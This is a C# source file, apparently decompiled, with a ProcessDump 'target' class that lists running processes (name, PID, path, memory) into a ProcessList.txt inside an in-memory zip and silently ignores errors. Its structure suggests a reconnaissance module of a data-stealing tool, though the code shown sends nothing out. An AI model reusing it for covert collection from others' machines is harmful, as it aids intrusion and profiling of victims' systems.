using Helper;
using Helper.Data;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Targets.Device
{
	public class ProcessDump : ITarget
	{
	  public void Collect(InMemoryZip zip, Counter counter)
	  {
	    try
	    {
	      List<ProcessWindows.ProcInfo> list = ProcessWindows.GetProcInfos().ToList<ProcessWindows.ProcInfo>();
	      if (list.Count == 0)
	        return;
	      int totalWidth1 = Math.Max("Name".Length, list.Max<ProcessWindows.ProcInfo>((Func<ProcessWindows.ProcInfo, int>) (p =>
	      {
	        string name = p.Name;
	        return name == null ? 0 : name.Length;
	      })));
	      int totalWidth2 = Math.Max("PID".Length, list.Max<ProcessWindows.ProcInfo>((Func<ProcessWindows.ProcInfo, int>) (p =>
	      {
	        string pid = p.Pid;
	        return pid == null ? 0 : pid.Length;
	      })));
	      int totalWidth3 = Math.Max("Path".Length, list.Max<ProcessWindows.ProcInfo>((Func<ProcessWindows.ProcInfo, int>) (p =>
	      {
	        string path = p.Path;
	        return path == null ? 0 : path.Length;
	      })));
	      int totalWidth4 = Math.Max("Mem".Length, list.Max<ProcessWindows.ProcInfo>((Func<ProcessWindows.ProcInfo, int>) (p =>
	      {
	        string memory = p.Memory;
	        return memory == null ? 0 : memory.Length;
	      })));
	      string str1 = $"{"Name".PadRight(totalWidth1)} | {"PID".PadRight(totalWidth2)} | {"Path".PadRight(totalWidth3)} | {"Mem".PadRight(totalWidth4)}";
	      string str2 = new string('-', str1.Length);
	      StringBuilder stringBuilder = new StringBuilder();
	      stringBuilder.AppendLine(str1);
	      stringBuilder.AppendLine(str2);
	      int result;
	      foreach (ProcessWindows.ProcInfo procInfo in (IEnumerable<ProcessWindows.ProcInfo>) list.OrderBy<ProcessWindows.ProcInfo, string>((Func<ProcessWindows.ProcInfo, string>) (x => x.Name ?? string.Empty)).ThenBy<ProcessWindows.ProcInfo, int>((Func<ProcessWindows.ProcInfo, int>) (x => int.TryParse(x.Pid, out result) ? result : int.MaxValue)))
	        stringBuilder.AppendLine($"{(procInfo.Name ?? "Unknown").PadRight(totalWidth1)} | {(procInfo.Pid ?? "Unknown").PadRight(totalWidth2)} | {(procInfo.Path ?? "Unknown").PadRight(totalWidth3)} | {(procInfo.Memory ?? "Unknown").PadRight(totalWidth4)}");
	      zip.AddTextFile("ProcessList.txt", stringBuilder.ToString());
	    }
	    catch
	    {
	    }
	  }
	}
}
